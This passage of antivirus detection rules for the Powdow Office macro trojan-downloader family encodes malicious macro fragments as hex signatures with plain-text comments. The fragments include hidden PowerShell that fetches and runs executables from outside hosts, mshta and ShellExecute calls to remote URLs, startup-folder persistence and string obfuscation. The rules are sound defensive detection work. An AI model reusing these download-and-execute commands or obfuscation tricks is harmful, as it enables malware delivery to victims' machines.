		$a_01_5 = {77 61 74 63 68 69 6e 67 79 6f 75 20 3d 20 6c 6f 76 65 6c 79 20 26 20 67 75 6e 74 6f 6d 31 20 26 20 67 75 6e 74 6f 6d 32 20 26 20 4c 65 66 74 28 67 75 6e 74 6f 6d 33 2c 20 32 29 } //1 watchingyou = lovely & guntom1 & guntom2 & Left(guntom3, 2)
		$a_01_6 = {68 6d 6d 32 20 3d 20 4c 65 66 74 28 68 6d 6d 2c 20 33 29 20 2b 20 22 70 22 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 2f 22 29 } //1 hmm2 = Left(hmm, 3) + "p" + String(1, "/")
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*2+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=7
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_43{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 04 00 00 "
		
	strings :
		$a_03_0 = {73 68 65 65 65 20 3d 20 22 53 68 65 22 [0-03] 6f 62 68 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 [0-16] 29 [0-03] 45 6e 64 20 53 75 62 } //1
		$a_03_1 = {26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 71 64 79 68 79 67 6d 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 70 6c 75 67 69 6e 73 2f 6d 61 73 74 65 72 78 2f 4e 65 77 5f 90 05 0f 05 28 30 2d 39 29 2e 65 60 78 65 22 } //2
		$a_03_2 = {26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 22 20 26 20 22 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 90 1b 00 22 } //1
		$a_03_3 = {3d 20 22 70 6f 77 65 72 73 5e 22 [0-20] 20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-0f] 2e 62 61 74 22 [0-20] 20 3d 20 22 68 65 6c 6c 22 } //1
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*2+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_44{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {47 65 74 44 46 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 26 20 22 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 6a 65 6a 65 2e 62 61 74 } //1 GetDF = Environ$("USERPROFILE") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jeje.bat
		$a_01_1 = {6c 6f 6c 20 3d 20 22 77 73 61 6d 6f 72 65 63 72 61 6d 6f 72 65 69 70 61 6d 6f 72 65 74 61 6d 6f 72 65 2e 73 61 6d 6f 72 65 68 65 6c 6c } //1 lol = "wsamorecramoreipamoretamore.samorehell
		$a_01_2 = {6c 6f 6c 69 20 3d 20 52 65 70 6c 61 63 65 28 6c 6f 6c 2c 20 22 61 6d 6f 72 65 22 2c 20 22 22 29 } //1 loli = Replace(lol, "amore", "")
		$a_01_3 = {6c 6f 76 65 20 3d 20 22 70 6f 61 6d 6f 72 65 77 65 72 73 61 6d 6f 72 65 68 65 6c 6c 2e 65 61 6d 6f 72 65 78 65 61 6d 6f 72 65 20 61 6d 6f 72 65 61 6d 6f 72 65 2d 77 69 6e 61 6d 6f 72 65 64 6f 77 73 61 6d 6f 72 65 74 79 61 6d 6f 72 65 6c 65 20 68 69 64 61 6d 6f 72 65 64 65 6e 20 2d 45 61 6d 6f 72 65 78 65 63 75 61 6d 6f 72 65 74 69 6f 6e 50 6f 6c 61 6d 6f 72 65 69 63 79 20 42 79 61 6d 6f 72 65 70 61 73 73 20 63 61 6c 63 2e 65 78 65 } //1 love = "poamorewersamorehell.eamorexeamore amoreamore-winamoredowsamoretyamorele hidamoreden -EamorexecuamoretionPolamoreicy Byamorepass calc.exe
		$a_01_4 = {53 65 74 20 61 20 3d 20 66 73 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 47 65 74 44 46 2c 20 54 72 75 65 29 } //1 Set a = fs.CreateTextFile(GetDF, True)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_45{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {6c 6f 64 68 69 20 3d 20 22 6d 22 20 2b 20 22 53 22 20 2b 20 22 48 22 20 2b 20 22 74 22 20 2b 20 22 41 22 } //1 lodhi = "m" + "S" + "H" + "t" + "A"
		$a_03_1 = {4d 73 67 42 6f 78 20 22 4c 6f 61 64 69 6e 67 2e 2e 2e 2e 22 3a 20 53 68 65 6c 6c 20 6c 6f 64 68 69 20 2b 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 25 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 40 6a 2e 6d 70 2f 22 20 2b 20 22 [0-0f] 22 20 2b 20 22 [0-16] 22 3a 20 53 68 65 6c 6c 20 22 } //2
		$a_03_2 = {4d 73 67 42 6f 78 20 22 4c 6f 61 64 69 6e 67 [0-07] 22 3a 20 53 68 65 6c 6c 20 6c 6f 64 68 69 20 2b 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 25 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 40 6a 2e 6d 70 2f 22 20 2b 20 22 68 64 6a 6b 73 61 64 68 6a 6b 73 61 22 20 2b 20 22 67 62 64 68 6b 61 73 67 64 68 6b 73 61 67 64 22 3a 20 53 68 65 6c 6c 20 22 } //2
		$a_01_3 = {45 78 63 65 6c 46 69 6c 65 20 3d 20 28 41 63 74 69 76 65 50 72 65 73 65 6e 74 61 74 69 6f 6e 2e 50 61 74 68 20 26 20 22 5c 74 65 73 74 2e 78 6c 73 78 22 29 } //1 ExcelFile = (ActivePresentation.Path & "\test.xlsx")
		$a_01_4 = {53 65 74 20 65 78 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 45 78 63 65 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //1 Set exl = CreateObject("Excel.Application")
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*2+(#a_03_2  & 1)*2+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_46{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 06 00 00 "
		
	strings :
		$a_01_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 59 61 6a 6f 6f 6a 6d 61 6a 6f 6f 6a 29 2e 45 78 65 63 20 6c 75 6c 69 31 20 2b 20 6c 75 6c 69 32 } //1 CreateObject(Yajoojmajooj).Exec luli1 + luli2
		$a_01_1 = {4d 73 67 20 3d 20 22 45 72 72 6f 72 20 23 20 22 20 26 20 22 20 50 6f 77 65 72 20 46 69 6c 65 20 65 72 72 6f 72 20 22 20 5f } //1 Msg = "Error # " & " Power File error " _
		$a_03_2 = {79 61 7a 65 65 64 31 30 20 3d 20 22 34 22 20 2b 20 22 38 22 20 2b 20 22 40 22 20 2b 20 22 62 69 74 6c 79 22 20 2b 20 22 2e 63 6f 6d 2f 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 64 73 61 73 61 62 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 [0-0f] 22 20 2b 20 22 73 61 22 } //1
		$a_01_3 = {44 65 62 75 67 2e 50 72 69 6e 74 20 28 53 68 65 6c 6c 28 49 41 6e 58 5a 78 63 4f 53 20 2b 20 42 68 39 67 44 41 30 44 34 20 2b 20 5a 34 42 56 71 5a 48 66 52 29 29 } //1 Debug.Print (Shell(IAnXZxcOS + Bh9gDA0D4 + Z4BVqZHfR))
		$a_01_4 = {5a 34 42 56 71 5a 48 66 52 20 3d 20 22 4c 4c 4c 64 77 64 6b 77 6f 6b 77 64 } //1 Z4BVqZHfR = "LLLdwdkwokwd
		$a_01_5 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 43 68 72 24 28 36 39 29 20 26 20 43 68 72 24 28 38 32 29 20 26 20 43 68 72 24 28 38 32 29 20 26 20 43 68 72 24 28 37 39 29 20 26 20 43 68 72 24 28 38 32 29 20 26 20 43 68 72 24 28 33 33 29 20 26 20 43 68 72 24 28 33 32 29 20 26 20 43 68 72 24 28 38 30 29 20 26 20 43 68 72 24 28 31 30 38 29 } //1 Debug.Print MsgBox(Chr$(69) & Chr$(82) & Chr$(82) & Chr$(79) & Chr$(82) & Chr$(33) & Chr$(32) & Chr$(80) & Chr$(108)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_47{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 05 00 00 "
		
	strings :
		$a_03_0 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 [0-03] 4d 73 67 42 6f 78 20 22 45 72 72 6f 72 21 21 } //1
		$a_01_1 = {43 61 6c 6c 20 6f 62 6a 53 68 65 6c 6c 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 6b 31 2e 6b 32 2e 54 61 67 2c 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 61 6a 64 77 77 64 77 64 77 64 6d 6c 72 75 66 68 6a 77 69 6a 6a 64 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 29 } //2 Call objShell.ShellExecute(k1.k2.Tag, "https://www.bitly.com/ajdwwdwdwdmlrufhjwijjd", "", "open", 1)
		$a_01_2 = {43 61 6c 6c 20 6f 62 6a 53 68 65 6c 6c 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 6b 31 2e 6b 32 2e 54 61 67 2c 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 77 64 6f 77 64 70 75 66 68 6a 77 69 6a 6a 64 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 29 } //2 Call objShell.ShellExecute(k1.k2.Tag, "https://www.bitly.com/wdowdpufhjwijjd", "", "open", 1)
		$a_01_3 = {43 61 6c 6c 20 6f 62 6a 53 68 65 6c 6c 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 6b 31 2e 6b 32 2e 54 61 67 2c 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 77 64 6b 66 6f 6b 77 64 6f 6b 72 75 66 68 6a 77 69 6a 6a 64 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 29 } //2 Call objShell.ShellExecute(k1.k2.Tag, "https://www.bitly.com/wdkfokwdokrufhjwijjd", "", "open", 1)
		$a_01_4 = {43 61 6c 6c 20 6f 62 6a 53 68 65 6c 6c 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 6b 31 2e 6b 32 2e 54 61 67 2c 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 61 6a 64 77 77 64 77 64 72 75 66 68 6a 77 69 6a 6a 64 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 29 } //2 Call objShell.ShellExecute(k1.k2.Tag, "https://www.bitly.com/ajdwwdwdrufhjwijjd", "", "open", 1)
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*2+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2+(#a_01_4  & 1)*2) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_48{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 "
		
	strings :
		$a_03_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 7b 20 69 77 72 20 68 74 74 70 3a 2f 2f 77 65 65 73 68 6f 70 70 69 2e 63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 49 44 33 2f [0-02] 2f 90 05 08 05 28 30 2d 39 29 2e 6a 70 67 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-0a] 2e 65 78 65 7d 3b 20 26 20 7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 } //1
		$a_03_1 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 7b 20 69 77 72 20 68 74 74 70 3a 2f 2f 31 30 34 2e 31 36 38 2e 31 36 30 2e 32 30 39 2f (4e 38|6e 65 77 73) 2f 90 05 08 05 28 30 2d 39 29 2e 6a 70 67 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-0a] 2e 65 78 65 7d 3b 20 26 20 7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 } //1
		$a_03_2 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 7b 20 69 77 72 20 68 74 74 70 3a 2f 2f 31 30 34 2e 31 36 38 2e 31 36 30 2e 32 30 39 2f (4e 38|6e 65 77 73) 2f 90 05 08 05 28 30 2d 39 29 2e 6a 70 67 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 50 69 63 74 75 72 65 73 5c [0-0a] 2e 65 78 65 7d 3b 20 26 20 7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 } //1
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1) >=1
 
}